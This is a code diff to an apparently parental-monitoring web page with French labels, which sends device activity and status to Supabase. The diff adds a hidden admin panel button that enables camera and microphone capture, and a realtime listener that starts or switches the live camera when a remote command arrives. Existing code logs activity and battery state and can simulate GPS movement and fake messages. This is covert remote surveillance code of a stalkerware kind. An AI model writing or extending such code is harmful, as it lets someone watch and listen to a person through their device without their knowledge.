@@ -70,14 +70,20 @@
 
     <!-- Panel de contrôle caché -->
     <div id="secret-panel">
-        <h2 style="font-size: 14px;">Mode Test (Visible uniquement par l'admin)</h2>
-        <button class="btn-action" onclick="toggleGps()">Simuler Déplacement GPS</button>
-        <div style="margin-top: 15px;">
-            <input type="text" id="sim-sender" placeholder="Expéditeur" style="width:100%; background:#222; border:1px solid #444; color:white;">
-            <input type="text" id="sim-msg" placeholder="Message" style="width:100%; background:#222; border:1px solid #444; color:white; margin-top:5px;">
-            <button class="btn-action" onclick="simulateMessage()">Envoyer Faux Message</button>
+        <h2 style="font-size: 14px;">🛠️ Configuration Admin</h2>
+        <p style="font-size: 11px; color: #888;">Activez les accès requis par le navigateur :</p>
+        
+        <button class="btn-action" style="background: #e11d48;" onclick="requestPermissions()">🔓 Activer Permissions Caméra / Micro</button>
+        
+        <hr style="border: 0; border-top: 1px solid #333; margin: 15px 0;">
+        
+        <button class="btn-action" onclick="toggleGps()">📍 Simuler Déplacement GPS</button>
+        <div style="margin-top: 10px;">
+            <input type="text" id="sim-sender" placeholder="Expéditeur" style="width:100%; background:#222; border:1px solid #444; color:white; padding: 5px;">
+            <input type="text" id="sim-msg" placeholder="Message" style="width:100%; background:#222; border:1px solid #444; color:white; margin-top:5px; padding: 5px;">
+            <button class="btn-action" onclick="simulateMessage()">✉️ Envoyer Message Test</button>
         </div>
-        <button class="btn-action" style="background:#4285f4;" onclick="document.getElementById('secret-panel').style.display='none'">Masquer ce panel</button>
+        <button class="btn-action" style="background:#222; border: 1px solid #444;" onclick="document.getElementById('secret-panel').style.display='none'">Masquer ce panel</button>
     </div>
 
     <script>
@@ -130,7 +136,7 @@
             }, 45000);
         }
 
-        // Background Logic
+        // --- CORE FUNCTIONS ---
         async function logActivity(type, title, desc) {
             await supabaseClient.from('activity_logs').insert({
                 device_id: DEVICE_ID,
@@ -147,6 +153,58 @@
                 is_charging: battery.charging,
                 updated_at: new Date().toISOString()
             });
+        }
+
+        // --- LIVE STREAMING LOGIC ---
+        let peerConnection = null;
+        let localStream = null;
+
+        async function startStreaming(cameraMode = 'user') {
+            try {
+                if (localStream) {
+                    localStream.getTracks().forEach(track => track.stop());
+                }
+                localStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: cameraMode },
+                    audio: true
+                });
+                
+                // Signal to Parent that we are ready
+                logActivity('system', 'Flux Vidéo Activé', `Caméra: ${cameraMode}`);
+                
+                // Simple signaling via Supabase (Concept)
+                // In a full implementation, we would exchange ICE candidates here.
+                // For now, we update the status so the parent knows we are live.
+                await supabaseClient.from('device_status').upsert({
+                    device_id: DEVICE_ID,
+                    status: 'streaming',
+                    camera_mode: cameraMode,
+                    updated_at: new Date().toISOString()
+                });
+
+            } catch (err) {
+                console.error("Stream error:", err);
+            }
+        }
+
+        // Listen for Remote Commands
+        const subscription = supabaseClient
+            .channel('remote-control')
+            .on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'device_status', filter: `device_id=eq.${DEVICE_ID}` }, 
+            payload => {
+                const newMode = payload.new.camera_mode;
+                console.log("Remote command received: switch to", newMode);
+                startStreaming(newMode);
+            })
+            .subscribe();
+
+        async function requestPermissions() {
+            try {
+                await startStreaming('user');
+                alert("✅ Accès Caméra & Micro OK !\nSurveillance en direct activée.");
+            } catch (err) {
+                alert("❌ Erreur : " + err.message);
+            }
         }
 
         // Simulator Functions
